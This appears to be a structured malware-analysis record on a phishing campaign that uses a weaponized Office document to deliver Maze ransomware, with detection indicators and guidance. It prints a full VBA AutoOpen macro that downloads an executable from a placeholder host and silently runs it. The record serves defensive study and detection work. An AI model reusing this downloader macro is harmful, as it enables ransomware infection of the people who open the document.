package_info.package_manager: N/A (delivered via email attachment, not a package manager)
package_info.why_malicious: The email campaign delivers weaponized Microsoft Office documents containing malicious macros that, when enabled by the user, download and execute the Maze ransomware payload. This results in the encryption of user files and extortion via ransom demands, causing significant data loss and operational disruption.

execution_context.trigger: When the user opens the malicious Office document and enables macros
execution_context.file_location: Embedded macro within the attached Office document (e.g., .docm, .xlsm) delivered via phishing email
required_permissions: filesystem (write and execute in TEMP directory)

malicious_snippets.code_snippet:
Sub AutoOpen()
  Dim objXML As Object
  Set objXML = CreateObject("MSXML2.XMLHTTP")
  objXML.Open "GET", "http://malicious-domain.com/payload.exe", False
  objXML.Send
  If objXML.Status = 200 Then
    Dim objStream As Object
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write objXML.responseBody
    objStream.SaveToFile Environ("TEMP") & "\payload.exe", 2
    objStream.Close
    Shell Environ("TEMP") & "\payload.exe", vbHide
  End If
End Sub
malicious_snippets.code_behavior: When the user opens the document and enables macros, the macro executes, initiates an HTTP GET request to a remote server to download a binary payload, writes the downloaded executable to the user's TEMP directory, and then silently executes the payload, resulting in Maze ransomware infection.

malice_analysis.why_suspicious: The macro automatically downloads and executes an external binary without user consent, a hallmark of malware delivery. The use of AutoOpen ensures the code runs as soon as the document is opened, maximizing the chance of infection.
malice_analysis.violated_expectations: Legitimate Office documents should not contain macros that fetch and execute arbitrary code from the internet, especially without user notification or interaction beyond enabling macros.
malice_analysis.similar_legitimate_use: In rare, highly controlled enterprise environments, macros may automate document processing or data retrieval, but they do not download and execute untrusted binaries from external sources.
key_indicators: Presence of AutoOpen macro that triggers on document open
Use of MSXML2.XMLHTTP object to perform outbound HTTP requests
Creation and use of ADODB.Stream to write binary data to disk
Saving an executable (payload.exe) to the TEMP directory
Silent execution of downloaded payload via Shell with vbHide
No user notification or visible indication of code execution

attack_chain.action: User receives a phishing email containing a malicious Office document as an attachment.
User opens the document and is prompted to enable macros.
attack_chain.leads_to: Macro code embedded in the document is executed.

attack_chain.action: The macro downloads the Maze ransomware payload from a remote server and executes it on the system.
attack_chain.leads_to: Maze ransomware is executed on the victim's system.

attack_chain.action: Maze ransomware encrypts user files and displays a ransom note demanding payment for decryption.
attack_chain.leads_to: Data is encrypted and the victim is extorted for ransom.

behavioral_signatures: Office documents containing macros that initiate outbound network connections to download executables
Macros using AutoOpen or Document_Open triggers to execute automatically upon document open
Use of MSXML2.XMLHTTP or similar COM objects in VBA macros for HTTP requests
Creation and execution of files in the TEMP directory by Office processes
Silent execution of downloaded binaries via Shell or similar methods
file_indicators: Office documents with embedded macros (e.g., .docm, .xlsm) received from external sources
Presence of payload.exe or similarly named executables in the user's TEMP directory
Unusual or obfuscated macro code in email attachments
Recent creation or execution of files in TEMP directory by Office applications
network_indicators: Outbound HTTP/HTTPS requests from Office processes (e.g., WINWORD.EXE, EXCEL.EXE) to domains not associated with the organization
Connections to known Maze ransomware command-and-control (C2) infrastructure or previously identified malicious domains (e.g., http://malicious-domain.com/payload.exe)
detection_knowledge.how_to_detect: Monitor for Office documents with macros that attempt to download and execute files, especially those using AutoOpen or Document_Open triggers. Flag Office processes making outbound network connections or writing executables to disk, particularly in the TEMP directory. Use sandboxing to analyze attachments for suspicious macro behavior. Block or alert on known Maze ransomware C2 domains and IPs. Implement email gateway filtering to quarantine or reject Office documents with suspicious macros from external sources.
